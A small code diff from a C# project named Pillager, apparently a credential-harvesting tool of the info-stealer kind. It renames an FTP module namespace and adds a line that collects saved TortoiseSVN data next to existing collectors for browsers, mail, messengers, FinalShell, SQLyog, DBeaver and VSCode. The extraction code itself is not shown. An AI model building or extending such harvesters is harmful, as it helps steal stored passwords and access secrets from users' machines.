@@ -1,6 +1,6 @@
 ﻿using System.IO;
 using Pillager.Browsers;
-using Pillager.FTP;
+using Pillager.FTPs;
 using Pillager.Helper;
 using Pillager.Mails;
 using Pillager.Messengers;
@@ -44,6 +44,7 @@ namespace Pillager
             FinalShell.Save(savepath);
             SQLyog.Save(savepath);
             DBeaver.Save(savepath);
+            TortoiseSVN.Save(savepath);
 
             //Softwares
             VSCode.Save(savepath);
